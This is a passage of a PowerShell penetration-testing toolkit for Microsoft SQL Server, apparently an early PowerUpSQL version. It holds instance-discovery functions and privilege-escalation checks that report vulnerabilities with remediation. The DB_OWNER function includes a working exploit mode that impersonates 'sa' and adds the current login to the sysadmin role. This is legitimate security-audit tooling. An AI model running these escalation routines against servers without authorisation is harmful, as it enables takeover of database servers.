                    $Instance = $ComputerName + "\" +$DisplayName.split("(")[1].split(")")[0] 
                    if($Instance -like "*\MSSQLSERVER"){
                        $Instance = $ComputerName
                    }
                }else{
                    $Instance = $ComputerName 
                }

                # Add record
                $TblLocalInstances.Rows.Add(
                [string]$_.ComputerName,
                [string]$Instance,
                [string]$_.ServiceDisplayName,
                [string]$_.ServiceName,
                [string]$_.ServicePath,
                [string]$_.ServiceAccount,
                [string]$_.ServiceState) | Out-Null                  
       }
    }

    End
    {  
        
        # Status User
        $LocalInstanceCount = $TblLocalInstances.rows.count
        Write-Verbose "$LocalInstanceCount local instances where found."

        # Return data
        $TblLocalInstances         
    }
}


# ----------------------------------
#  Get-SQLInstanceScanUDP
# ----------------------------------
# Author: Eric Gruber
# Note: Pipeline and timeout mods by Scott Sutherland
function Get-SQLInstanceScanUDP
{
<#
    .SYNOPSIS
        Returns a list of SQL Servers resulting from a UDP discovery scan of provided computers.
    .PARAMETER ComputerName
        Computer name or IP address to enumerate SQL Instance from.
    .PARAMETER UDPTimeOut
        Timeout in seconds. Longer timeout = more accurate.    
    .EXAMPLE
        PS C:\> Get-SQLInstanceScanUDP -Verbose -ComputerName SQLServer1.domain.com
        VERBOSE:  - SQLServer1.domain.com - UDP Scan Start.
        VERBOSE:  - SQLServer1.domain.com - UDP Scan Complete.

        ComputerName : SQLServer1.domain.com
        Instance     : SQLServer1.domain.com\Express
        InstanceName : Express
        ServerIP     : 10.10.10.30
        TCPPort      : 51663
        BaseVersion  : 11.0.2100.60
        IsClustered  : No

        ComputerName : SQLServer1.domain.com
        Instance     : SQLServer1.domain.com\Standard
        InstanceName : Standard
        ServerIP     : 10.10.10.30
        TCPPort      : 51861
        BaseVersion  : 11.0.2100.60
        IsClustered  : No
    .EXAMPLE
        PS C:\> Get-SQLInstanceDomain | Get-SQLInstanceScanUDP -Verbose
        VERBOSE:  - SQLServer1.domain.com - UDP Scan Start.
        VERBOSE:  - SQLServer1.domain.com - UDP Scan Complete.


        ComputerName : SQLServer1.domain.com
        Instance     : SQLServer1.domain.com\Express
        InstanceName : Express
        ServerIP     : 10.10.10.30
        TCPPort      : 51663
        BaseVersion  : 11.0.2100.60
        IsClustered  : No

        ComputerName : SQLServer1.domain.com
        Instance     : SQLServer1.domain.com\Standard
        InstanceName : Standard
        ServerIP     : 10.10.10.30
        TCPPort      : 51861
        BaseVersion  : 11.0.2100.60
        IsClustered  : No
        [TRUNCATED]                
#>
    [CmdletBinding()]
    param(

        [Parameter(Mandatory=$true,
        ValueFromPipeline,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Computer name or IP address to enumerate SQL Instance from.")]
        [string]$ComputerName,

        [Parameter(Mandatory=$false,        
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Timeout in seconds. Longer timeout = more accurate.")]
        [int]$UDPTimeOut = 2
    )

    Begin 
    {
        # Setup data table for results
        $TableResults = New-Object -TypeName system.Data.DataTable -ArgumentList 'Table'
        $TableResults.columns.add("ComputerName") | Out-Null
        $TableResults.columns.add("Instance") | Out-Null
        $TableResults.columns.add("InstanceName") | Out-Null
        $TableResults.columns.add("ServerIP") | Out-Null
        $TableResults.columns.add("TCPPort") | Out-Null
        $TableResults.columns.add("BaseVersion") | Out-Null
        $TableResults.columns.add("IsClustered") | Out-Null           
    }

    Process
    {
        Write-Verbose " - $ComputerName - UDP Scan Start."

        # Verify server name isn't empty
        if ($ComputerName -ne '')
        {        
            # Try to enumerate SQL Server instances from remote system             
            try
            {
                # Resolve IP
                $IPAddress = [System.Net.Dns]::GetHostAddresses($ComputerName)

                # Create UDP client object
                $UDPClient = New-Object -TypeName System.Net.Sockets.Udpclient

                # Attempt to connect to system
                $UDPTimeOutMilsec = $UDPTimeOut * 1000
                $UDPClient.client.ReceiveTimeout = $UDPTimeOutMilsec
                $UDPClient.Connect($ComputerName,0x59a)
                $UDPPacket = 0x03  

                # Send request to system
                $UDPEndpoint = New-Object -TypeName System.Net.Ipendpoint -ArgumentList ([System.Net.Ipaddress]::Any, 0)
                $UDPClient.Client.Blocking = $true
                [void]$UDPClient.Send($UDPPacket,$UDPPacket.Length)

                # Process response from system
                $BytesRecived = $UDPClient.Receive([ref]$UDPEndpoint)
                $Response = [System.Text.Encoding]::ASCII.GetString($BytesRecived).split(';')

                $values = @{}
           
                for($i = 0; $i -le $Response.length; $i++)
                {
                    if(![string]::IsNullOrEmpty($Response[$i])) 
                    {
                        $values.Add(($Response[$i].ToLower() -replace '[\W]', ''),$Response[$i+1])
                    }
                    else 
                    {
                        if(![string]::IsNullOrEmpty($values.'tcp'))
                        {
                            # Add SQL Server instance info to results table
                            $TableResults.rows.Add(
                                [string]$ComputerName,
                                [string]"$ComputerName\"+$values.'instancename',                                
                                [string]$values.'instancename',                                
                                [string]$IPAddress,
                                [string]$values.'tcp',
                                [string]$values.'version',
                                [string]$values.'isclustered') | Out-Null
                            $values = @{}
                        }
                    }
                }

                # Close connection
                $UDPClient.Close()
            }
            catch
            {
                #"Error was $_"
                #$line = $_.InvocationInfo.ScriptLineNumber
                #"Error was in Line $line"

                # Close connection
                # $UDPClient.Close()
            } 
        }       
   
        Write-Verbose " - $ComputerName - UDP Scan Complete."
    }

    End
    {
        # Return Results
        $TableResults 
    }
}


# ----------------------------------
#  Get-SQLInstanceFile
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLInstanceFile {
<#
    .SYNOPSIS
        Returns a list of SQL Server instances from a file.  
        One per line. Three instance formats supported:
        1 - computername
        2 - computername\instance
        3 - computername,1433
    .PARAMETER FilePath
        Path to file containing instances.  One per line.
    .EXAMPLE
        PS C:\> Get-SQLInstanceFile -Verbose -FilePath c:\temp\servers.txt
        VERBOSE: Importing instances from file path.
        VERBOSE: 3 instances where found in c:\temp\servers.txt.

        ComputerName   Instance                      
        ------------   --------                      
        Computer1      Computer1\SQLEXPRESS     
        Computer1      Computer1\STANDARDDEV2014
        Computer1      Computer1                
#>
    [CmdletBinding()]
    Param(        
        [Parameter(Mandatory=$true,
        HelpMessage="The file path.")]
        [string]$FilePath
    )

    Begin
    {
        # Table for output
        $TblFileInstances = New-Object System.Data.DataTable
        $TblFileInstances.Columns.Add("ComputerName") | Out-Null
        $TblFileInstances.Columns.Add("Instance") | Out-Null
    }

    Process
    {       
        # Test file path
        if(Test-Path $FilePath){
            Write-Verbose "Importing instances from file path."
        }else{
            Write-Output "File path does not appear to be valid."
            break
        }
              
       # Grab lines from file
       Get-Content -Path $FilePath |
       ForEach-Object{

            $Instance = $_
            if($Instance.Split(',')[1]){
                $ComputerName = $Instance.Split(',')[0]
            }else{
                $ComputerName = $Instance.Split('\')[0]
            }
            
            # Add record
            if($_ -ne ""){
                $TblFileInstances.Rows.Add($ComputerName,$Instance) | Out-Null                  
            }
       }
    }

    End
    {  
        
        # Status User
        $FileInstanceCount = $TblFileInstances.rows.count
        Write-Verbose "$FileInstanceCount instances where found in $FilePath."

        # Return data
        $TblFileInstances         
    }
}
#endregion

#########################################################################
#
#region          PASSWORD RECOVERY FUNCTIONS
#
#########################################################################
#
#endregion

#########################################################################
#
#region          DATA EXFILTRATION FUNCTIONS
#
#########################################################################
#
#endregion

#########################################################################
#
#region          PERSISTENCE FUNCTIONS
#
#########################################################################
#
#endregion

#########################################################################
#
#region          PRIVILEGE ESCALATION FUNCTIONS
#
#########################################################################

# ---------------------------------------
# Template Function
# ---------------------------------------
# Author: Scott Sutherland
# Note: This is just a template for building other escalation functions.
Function Invoke-SQLEscalate-Template {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server or domain account to authenticate with.")]
        [string]$Username,

        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server or domain account password to authenticate with.")]
        [string]$Password,

        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Windows credentials.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server instance to connection to.")]
        [string]$Instance,       

        [Parameter(Mandatory=$false,
        HelpMessage="Don't output anything.")]
        [string]$NoOutput,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Exploit vulnerable issues.")]
        [switch]$Exploit
    )

    Begin
    {                 
        # Table for output
        $TblData = New-Object System.Data.DataTable 
        $TblData.Columns.Add("ComputerName") | Out-Null
        $TblData.Columns.Add("Instance") | Out-Null
        $TblData.Columns.Add("Vulnerability") | Out-Null
        $TblData.Columns.Add("Description") | Out-Null
        $TblData.Columns.Add("Remediation") | Out-Null
        $TblData.Columns.Add("Severity") | Out-Null
        $TblData.Columns.Add("IsVulnerable") | Out-Null
        $TblData.Columns.Add("IsExploitable") | Out-Null
        $TblData.Columns.Add("Exploited") | Out-Null
        $TblData.Columns.Add("ExploitCmd") | Out-Null
        $TblData.Columns.Add("Details") | Out-Null    
        $TblData.Columns.Add("Reference") | Out-Null   
        $TblData.Columns.Add("Author") | Out-Null   
    }

    Process
    {   
        # Status User
        Write-Verbose "$Instance : START VULNERABILITY CHECK: [VULNERABILITY NAME]" 

        # Test connection to server
        $TestConnection =  Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object {$_.Status -eq "Accessible"}
        if(-not $TestConnection){   
            
            # Status user
            Write-Verbose "$Instance : CONNECTION FAILED."
            Write-Verbose "$Instance : COMPLETED VULNERABILITY CHECK: [VULNERABILITY NAME]."           
            Return
        }else{
            Write-Verbose "$Instance : CONNECTION SUCCESS."
        }

        # Grab server information
        $ServerInfo =  Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential 
        $CurrentLogin = $ServerInfo.CurrentLogin
        $ComputerName = $ServerInfo.ComputerName

        # --------------------------------------------     
        # Set function meta data for report output
        # --------------------------------------------  
        if($Exploit){
            $TestMode  = "Exploit"
        }else{
            $TestMode  = "Audit"
        }         
        $Vulnerability = ""
        $Description   = ""
        $Remediation   = ""
        $Severity      = "" 
        $IsVulnerable  = "No"
        $IsExploitable = "No" 
        $Exploited     = "No"
        $ExploitCmd    = "[CurrentCommand] -Instance $Instance -Exploit"
        $Details       = ""   
        $Reference     = ""       
        $Author        = "First Last (Twitter), Company Year" 
        
        # -----------------------------------------------------------------     
        # Check for the Vulnerability
        # Note: Typically a missing patch or weak configuration
        # -----------------------------------------------------------------     
        # $IsVulnerable  = "No" or $IsVulnerable  = "Yes" 

        
        # -----------------------------------------------------------------     
        # Check for exploit dependancies 
        # Note: Typically secondary configs required for dba/os execution
        # -----------------------------------------------------------------
        # $IsExploitable = "No" or $IsExploitable = "Yes"


        # -----------------------------------------------------------------    
        # Exploit Vulnerability
        # Note: Add the current user to sysadmin fixed server role
        # -----------------------------------------------------------------        
        # $Exploited = "No" or $Exploited     = "Yes" 
                       
            
        # Add to report example
        $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author) | Out-Null            

        # Status User
        Write-Verbose "$Instance : COMPLETED VULNERABILITY CHECK: [VULNERABILITY NAME]" 
    }

    End
    {   
        # Return data  
        if ( -not $NoOutput){            
            Return $TblData       
        }
    }
}


# ---------------------------------------
# Invoke-SQLEscalate-CreateProcedure
# ---------------------------------------
# Author: Scott Sutherland
Function Invoke-SQLEscalate-CreateProcedure {
<#
    .SYNOPSIS
        Check if the current login has the CREATE PROCEDURE permission.  Attempt to leverage to obtain sysadmin privileges.
    .PARAMETER Username
        SQL Server or domain account to authenticate with.   
    .PARAMETER Password
        SQL Server or domain account password to authenticate with. 
    .PARAMETER Credential
        SQL Server credential. 
    .PARAMETER Instance
        SQL Server instance to connection to. 
    .PARAMETER NoOutput
        Don't output anything.
    .PARAMETER Exploit
        Exploit vulnerable issues
    .EXAMPLE
        PS C:\> Get-SQLInstanceLocal | Invoke-SQLEscalate-CreateProcedure -Username evil -Password Password123!

        ComputerName  : SQLServer1
        Instance      : SQLServer1\STANDARDDEV2014
        Vulnerability : PERMISSION - CREATE PROCEDURE
        Description   : The login has privileges to create stored procedures in one or more databases.  This may allow the login to escalate privileges within the database.
        Remediation   : If the permission is not required remove it.  Permissions are granted with a command like: GRANT CREATE PROCEDURE TO user, and can be removed with a 
                        command like: REVOKE CREATE PROCEDURE TO user.
        Severity      : Medium
        IsVulnerable  : Yes
        IsExploitable : No
        Exploited     : No
        ExploitCmd    : No exploit is currently available that will allow evil to become a sysadmin.
        Details       : The evil principal has the CREATE PROCEDURE permission in the testdb database.
        Reference     : https://msdn.microsoft.com/en-us/library/ms187926.aspx?f=255&MSPPError=-2147217396
        Author        : Scott Sutherland (@_nullbind), NetSPI 2016
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server or domain account to authenticate with.")]
        [string]$Username,

        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server or domain account password to authenticate with.")]
        [string]$Password,

        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Windows credentials.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server instance to connection to.")]
        [string]$Instance,       

        [Parameter(Mandatory=$false,
        HelpMessage="Don't output anything.")]
        [string]$NoOutput,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Exploit vulnerable issues.")]
        [switch]$Exploit
    )

    Begin
    {                 
        # Table for output
        $TblData = New-Object System.Data.DataTable 
        $TblData.Columns.Add("ComputerName") | Out-Null
        $TblData.Columns.Add("Instance") | Out-Null
        $TblData.Columns.Add("Vulnerability") | Out-Null
        $TblData.Columns.Add("Description") | Out-Null
        $TblData.Columns.Add("Remediation") | Out-Null
        $TblData.Columns.Add("Severity") | Out-Null
        $TblData.Columns.Add("IsVulnerable") | Out-Null
        $TblData.Columns.Add("IsExploitable") | Out-Null
        $TblData.Columns.Add("Exploited") | Out-Null
        $TblData.Columns.Add("ExploitCmd") | Out-Null
        $TblData.Columns.Add("Details") | Out-Null    
        $TblData.Columns.Add("Reference") | Out-Null   
        $TblData.Columns.Add("Author") | Out-Null   
    }

    Process
    {   
        # Status User
        Write-Verbose "$Instance : START VULNERABILITY CHECK: PERMISSION - CREATE PROCEDURE" 

        # Test connection to server
        $TestConnection =  Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object {$_.Status -eq "Accessible"}
        if(-not $TestConnection){   
            
            # Status user
            Write-Verbose "$Instance : CONNECTION FAILED"
            Write-Verbose "$Instance : COMPLETED VULNERABILITY CHECK: PERMISSION - CREATE PROCEDURE"           
            Return
        }else{
            Write-Verbose "$Instance : CONNECTION SUCCESS"
        }

        # Grab server, login, and role information
        $ServerInfo =  Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential 
        $ComputerName = $ServerInfo.ComputerName                
        $CurrentLogin = $ServerInfo.CurrentLogin        
        $CurrentLoginRoles = Get-SQLServerRoleMember -Instance $Instance  -Username $Username -Password $Password -Credential $Credential -PrincipalName $CurrentLogin               
        $CurrentPrincpalList = @()
        $CurrentPrincpalList += $CurrentLogin
        $CurrentPrincpalList += 'Public'
        $CurrentLoginRoles | 
        ForEach-Object{
            $CurrentPrincpalList += $_.RolePrincipalName
        }        
        
        # --------------------------------------------     
        # Set function meta data for report output
        # --------------------------------------------  
        if($Exploit){
            $TestMode  = "Exploit"
        }else{
            $TestMode  = "Audit"
        }       
        $Vulnerability = "PERMISSION - CREATE PROCEDURE"
        $Description   = "The login has privileges to create stored procedures in one or more databases.  This may allow the login to escalate privileges within the database."
        $Remediation   = "If the permission is not required remove it.  Permissions are granted with a command like: GRANT CREATE PROCEDURE TO user, and can be removed with a command like: REVOKE CREATE PROCEDURE TO user"
        $Severity      = "Medium" 
        $IsVulnerable  = "No"
        $IsExploitable = "No" 
        $Exploited     = "No"
        $ExploitCmd    = "No exploit is currently available that will allow $CurrentLogin to become a sysadmin."
        $Details       = ""   
        $Dependancies = ""
        $Reference     = "https://msdn.microsoft.com/en-us/library/ms187926.aspx?f=255&MSPPError=-2147217396"       
        $Author        = "Scott Sutherland (@_nullbind), NetSPI 2016" 
        
        # -----------------------------------------------------------------     
        # Check for the Vulnerability
        # Note: Typically a missing patch or weak configuration
        # -----------------------------------------------------------------         

        # Get all CREATE PROCEDURE grant permissions for all accessible databases
        $Permissions = Get-SqlDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -HasAccess | Get-SqlDatabasePriv -Instance $Instance -Username $Username -Password $Password -Credential $Credential -PermissionName "CREATE PROCEDURE"
        
        if($Permissions){

            # Iterate through each current login and their associated roles
            $CurrentPrincpalList|
            ForEach-Object {

                # Check if they have the CREATE PROCEDURE grant
                $CurrentPrincipal = $_
                $Permissions | 
                ForEach-Object{
                                        
                    $AffectedPrincipal = $_.PrincipalName
                    $AffectedDatabase =  $_.DatabaseName
                
                    if($AffectedPrincipal-eq $CurrentPrincipal){
                                          
                        # Set flag to vulnerable
                        $IsVulnerable  = "Yes"
                        Write-Verbose "$Instance : - The $AffectedPrincipal principal has the CREATE PROCEDURE permission in the $AffectedDatabase database."
                        $Details = "The $AffectedPrincipal principal has the CREATE PROCEDURE permission in the $AffectedDatabase database."

                        # -----------------------------------------------------------------     
                        # Check for exploit dependancies 
                        # Note: Typically secondary configs required for dba/os execution
                        # -----------------------------------------------------------------                        
                        $HasAlterSchema = Get-SqlDatabasePriv -Instance $Instance -Username $Username -Password $Password -Credential $Credential -PermissionName "ALTER" -PermissionType "SCHEMA" -PrincipalName $CurrentPrincipal -DatabaseName $AffectedDatabase                                                
                        if($HasAlterSchema){
                            $IsExploitable = "Yes"  
                            $Dependancies = " $CurrentPrincipal also has ALTER SCHEMA permissions so procedures can be created." 
                            Write-Verbose "$Instance : - Dependancies were met: $CurrentPrincipal has ALTER SCHEMA permissions."

                            # Add to report example
                            $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, "$Details$Dependancies", $Reference, $Author) | Out-Null                                            
                        }else{                            
                            $IsExploitable = "No"
                            
                            # Add to report example
                            $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author) | Out-Null                                                                   
                        }                                       

                        # -----------------------------------------------------------------    
                        # Exploit Vulnerability
                        # Note: Add the current user to sysadmin fixed server role
                        # -----------------------------------------------------------------    
                        
                        if($Exploit -and $IsExploitable -eq "Yes"){ 
                            
                            Write-Verbose "$Instance : - No server escalation method is available at this time."
                        }
                        
                    }         
                }
            }                     
        }else{

            # Status user
            Write-Verbose "$Instance : - The current login doesn't have the CREATE PROCEDURE permission in any databases."
        }              
                                                    
        # Status User
        Write-Verbose "$Instance : COMPLETED VULNERABILITY CHECK: PERMISSION - CREATE PROCEDURE" 
    }

    End
    {   
        # Return data  
        if ( -not $NoOutput){            
            Return $TblData       
        }
    }
}


# ---------------------------------------
# Invoke-SQLEscalate-DbOwnerRole
# ---------------------------------------
# Author: Scott Sutherland
Function Invoke-SQLEscalate-DbOwnerRole {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server or domain account to authenticate with.")]
        [string]$Username,

        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server or domain account password to authenticate with.")]
        [string]$Password,

        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Windows credentials.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server instance to connection to.")]
        [string]$Instance,       

        [Parameter(Mandatory=$false,
        HelpMessage="Don't output anything.")]
        [string]$NoOutput,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Exploit vulnerable issues.")]
        [switch]$Exploit
    )

    Begin
    {                 
        # Table for output
        $TblData = New-Object System.Data.DataTable 
        $TblData.Columns.Add("ComputerName") | Out-Null
        $TblData.Columns.Add("Instance") | Out-Null
        $TblData.Columns.Add("Vulnerability") | Out-Null
        $TblData.Columns.Add("Description") | Out-Null
        $TblData.Columns.Add("Remediation") | Out-Null
        $TblData.Columns.Add("Severity") | Out-Null
        $TblData.Columns.Add("IsVulnerable") | Out-Null
        $TblData.Columns.Add("IsExploitable") | Out-Null
        $TblData.Columns.Add("Exploited") | Out-Null
        $TblData.Columns.Add("ExploitCmd") | Out-Null
        $TblData.Columns.Add("Details") | Out-Null    
        $TblData.Columns.Add("Reference") | Out-Null   
        $TblData.Columns.Add("Author") | Out-Null   
    }

    Process
    {   
        # Status User
        Write-Verbose "$Instance : START VULNERABILITY CHECK: DATABASE ROLE - DB_OWNER" 

        # Test connection to server
        $TestConnection =  Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object {$_.Status -eq "Accessible"}
        if(-not $TestConnection){   
            
            # Status user
            Write-Verbose "$Instance : CONNECTION FAILED"
            Write-Verbose "$Instance : COMPLETED VULNERABILITY CHECK: DATABASE ROLE - DB_OWNER"           
            Return
        }else{
            Write-Verbose "$Instance : CONNECTION SUCCESS"
        }

        # Grab server, login, and role information
        $ServerInfo =  Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential 
        $ComputerName = $ServerInfo.ComputerName                
        $CurrentLogin = $ServerInfo.CurrentLogin        
        $CurrentLoginRoles = Get-SQLServerRoleMember -Instance $Instance -Username $Username -Password $Password -Credential $Credential -PrincipalName $CurrentLogin               
        $CurrentPrincpalList = @()
        $CurrentPrincpalList += $CurrentLogin       
        $CurrentPrincpalList += 'Public'
        $CurrentLoginRoles | ForEach-Object{ $CurrentPrincpalList += $_.RolePrincipalName }        
        
        # --------------------------------------------     
        # Set function meta data for report output
        # --------------------------------------------  
        if($Exploit){
            $TestMode  = "Exploit"
        }else{
            $TestMode  = "Audit"
        }       
        $Vulnerability = "DATABASE ROLE - DB_OWNER"
        $Description   = "The login has the DB_OWER role in one or more databases.  This may allow the login to escalate privileges to sysadmin if the affected databases are trusted and owned by a sysadmin."
        $Remediation   = "If the permission is not required remove it.  Permissions are granted with a command like: EXEC sp_addrolemember 'DB_OWNER', 'MyDbUser', and can be removed with a command like:  EXEC sp_droprolemember 'DB_OWNER', 'MyDbUser'"
        $Severity      = "Medium" 
        $IsVulnerable  = "No"
        $IsExploitable = "No" 
        $Exploited     = "No"
        if($Username){
            $ExploitCmd    = "Invoke-SQLEscalate-DbOwnerRole -Instance $Instance -Username $Username -Password $Password -Exploit"
        }else{
            $ExploitCmd    = "Invoke-SQLEscalate-DbOwnerRole -Instance $Instance -Exploit"
        }
        $Details       = ""   
        $Dependancies = "Affected databases must be owned by a sysadmin and be trusted."
        $Reference     = "https://msdn.microsoft.com/en-us/library/ms189121.aspx,https://msdn.microsoft.com/en-us/library/ms187861.aspx"       
        $Author        = "Scott Sutherland (@_nullbind), NetSPI 2016" 
        
        # -----------------------------------------------------------------     
        # Check for the Vulnerability
        # Note: Typically a missing patch or weak configuration
        # -----------------------------------------------------------------         

        # Iterate through each current login and their associated roles
        $CurrentPrincpalList|
        ForEach-Object {
            
            # Check if login or role has the DB_OWNER roles in any databases
            $DBOWNER = Get-SQLDatabaseRoleMember -Instance $Instance -RolePrincipalName DB_OWNER -PrincipalName $_

            # -----------------------------------------------------------------     
            # Check for exploit dependancies 
            # Note: Typically secondary configs required for dba/os execution
            # -----------------------------------------------------------------
            
            # Check for db ownerships  
            if($DBOWNER){

                # Add an entry for each database where the user has the db_owner role
                $DBOWNER|
                ForEach-Object{
                    $DatabaseTarget = $_.DatabaseName
                    $PrincipalTarget = $_.PrincipalName

                    Write-Verbose "$Instance : - $PrincipalTarget has the DB_OWNER role in the $DatabaseTarget database."
                    $IsVulnerable = "Yes"

                    # Check if associated database is trusted and the owner is a sysadmin                  
                    $Depends = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseTarget | Where-Object {$_.is_trustworthy_on -eq 1 -and $_.OwnerIsSysadmin -eq 1 } 

                    if($Depends){
                        $IsExploitable = "Yes"
                        Write-Verbose "$Instance : - The $DatabaseTarget database is set as trustworthy and is owned by a sysadmin. This is exploitable."
                        
                        # -----------------------------------------------------------------    
                        # Exploit Vulnerability
                        # Note: Add the current user to sysadmin fixed server role
                        # -----------------------------------------------------------------                     
                        if($Exploit){                                                    

                            # Check if user is already a sysadmin
                            $SysadminPreCheck =  Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "SELECT IS_SRVROLEMEMBER('sysadmin','$CurrentLogin') as Status" | Select-Object Status -ExpandProperty Status                                            
                            if($SysadminPreCheck -eq 0){

                                # Status user
                                Write-Verbose "$Instance : - EXPLOITING: Verified that the current user ($CurrentLogin) is NOT a sysadmin."
                                Write-Verbose "$Instance : - EXPLOITING: Attempting to add the current user ($CurrentLogin) to the sysadmin role by using DB_OWNER permissions..."                            
                                                        
                                # Attempt to add the current login to sysadmins fixed server role
                                Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "EXECUTE AS LOGIN = 'sa';EXEC sp_addsrvrolemember '$CurrentLogin','sysadmin';Revert" | Out-Null                                              

                                 # Verify the login was added successfully
                                $SysadminPostCheck =  Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "SELECT IS_SRVROLEMEMBER('sysadmin','$CurrentLogin') as Status" | Select-Object Status -ExpandProperty Status               
                                if($SysadminPostCheck -eq 1){
                                    Write-Verbose "$Instance : - EXPLOITING: It was possible to make the current user ($CurrentLogin) a sysadmin!"
                                    $Exploited = "Yes"
                                }else{
                                    
                                }                                                      
                            }else{
                                Write-Verbose "$Instance : - EXPLOITING: It was not possible to make the current user ($CurrentLogin) a sysadmin."
                            }
                           
                            #Add record
                            $Details = "$PrincipalTarget has the DB_OWNER role in the $DatabaseTarget database."
                            $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author) | Out-Null                                                                   
                        }else{
                            #Add record                            
                            $Details = "$PrincipalTarget has the DB_OWNER role in the $DatabaseTarget database."                            
                            $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author) | Out-Null                                                                   
                        }                    
                    }else{

                        #Add record
                        Write-Verbose "$Instance : - The $DatabaseTarget is not exploitable."
                        $Details = "$PrincipalTarget has the DB_OWNER role in the $DatabaseTarget database, but this was not exploitable."
                        $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author) | Out-Null                                                                   
                    }
                }
            }                                                                                     
        }                                  
                                                    
        # Status User
        Write-Verbose "$Instance : COMPLETED VULNERABILITY CHECK: DATABASE ROLE - DB_OWNER" 
    }

    End
    {   
        # Return data  
        if ( -not $NoOutput){            
            Return $TblData       
        }
    }
}


# -----------------------------------
# Invoke-SQLEscalate-ImpersonateLogin
# -----------------------------------
# Author: Scott Sutherland
Function Invoke-SQLEscalate-ImpersonateLogin {
<#
    .SYNOPSIS
        Check if the current login has the IMPERSONATE permission on any sysadmin logins. Attempt to use permission to obtain sysadmin privileges.
    .PARAMETER Username
        SQL Server or domain account to authenticate with.   
    .PARAMETER Password
        SQL Server or domain account password to authenticate with. 
    .PARAMETER Credential
        SQL Server credential. 
    .PARAMETER Instance
        SQL Server instance to connection to. 
    .PARAMETER NoOutput
        Don't output anything.
    .PARAMETER Exploit
        Exploit vulnerable issues
    .EXAMPLE
        PS C:\> Invoke-SQLEscalate-ImpersonateLogin -Instance SQLServer1\STANDARDDEV2014 -Username evil -Password Password123!

        ComputerName  : SQLServer1
        Instance      : SQLServer1\STANDARDDEV2014
        Vulnerability : PERMISSION - IMPERSONATE LOGIN
        Description   : The current SQL Server login can impersonate other logins.  This may allow an authenticated login to gain additional privileges.
        Remediation   : Consider using an alterative to impersonation such as signed stored procedures. Impersonation is enabled using a command like: GRANT IMPERSONATE ON 
                        Login::sa to [user]. It can be removed using a command like: REVOKE IMPERSONATE ON Login::sa to [user]
        Severity      : High
        IsVulnerable  : Yes
        IsExploitable : Yes
        Exploited     : No
        ExploitCmd    : Invoke-SQLEscalate-ImpersonateLogin -Instance SQLServer1\STANDARDDEV2014 -Exploit
        Details       : public can impersonate the sa SYSADMIN login. This test was ran with the evil login.
        Reference     : https://msdn.microsoft.com/en-us/library/ms181362.aspx
        Author        : Scott Sutherland (@_nullbind), NetSPI 2016
    .EXAMPLE
        PS C:\> Invoke-SQLEscalate-ImpersonateLogin -Instance SQLServer1\STANDARDDEV2014 -Username evil -Password Password123! -Exploit

        ComputerName  : SQLServer1
        Instance      : SQLServer1\STANDARDDEV2014
